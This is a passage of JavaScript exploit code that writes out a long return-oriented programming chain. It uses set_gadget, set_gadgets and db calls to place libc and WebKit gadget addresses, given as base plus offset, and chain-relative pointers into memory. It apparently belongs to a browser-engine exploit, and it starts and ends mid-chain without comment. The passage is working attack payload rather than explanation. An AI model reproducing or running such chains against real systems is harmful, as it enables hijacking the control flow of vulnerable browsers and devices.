libc_base+471355, 
libc_base+788575, 
ropchain+282832, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294288, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+282968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+283120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+283248, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+283240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+283264, 
ropchain+283712, 
libc_base+50775, 
libc_base+793877, 
ropchain+283336, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+283488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+283472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+283504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+283608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+283704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+283688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+283768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+283856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+283872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+284024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+284056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+284008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284040, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+284152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+284136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+284240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284312, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967028, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+284376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+275632, 
libc_base+793877, 
ropchain+284488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+284728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+284744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+284712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+284832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+284848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+285000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285032, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+284984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285128, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+285112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+285232, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+285368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285352, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+285488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967032, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967032, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+285632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+285800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+285784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+285816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+285904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+285920, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+286016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+286000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4294901760, 4294967295]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+286128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+286264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286232, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+286368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+286352, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+286464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+286552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+286568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+286720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+286752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+286736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+286824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+286840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+287000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+286968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+286952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+287080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287096, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+287256, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+287240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+287376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+287424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+287408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+287536, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+287528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+287552, 
ropchain+287568, 
libc_base+811575, 
ropchain+292896, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967024, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+287664, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+287720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+287784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967024, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+287872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+287888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+288040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+288024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+288056, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+288336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288472, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+288672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+288656, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+288792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+288840, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+288824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+288952, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+288944, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+288968, 
ropchain+288984, 
libc_base+811575, 
ropchain+289000, 
libc_base+811575, 
ropchain+292880, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+289248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+289336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+289488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+289504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+289472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+289592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+289752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+289720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+289736, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+289824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+289880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+289976, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967024, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+290064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+290232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+290424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+290392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+290496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290512, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+290600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+290656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+290776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+290960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+290992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+290944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+290976, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291176, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+291160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+291280, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294288, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+291416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+291400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+291536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+291568, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+291696, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+291688, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+291712, 
ropchain+292160, 
libc_base+50775, 
libc_base+793877, 
ropchain+291784, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+291936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+291968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+291920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+291952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+292040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+292056, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+292152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+292136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+292216, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967024, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+292304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+292320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+292472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+292504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+292456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+292488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+292600, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+292584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+292688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+292760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
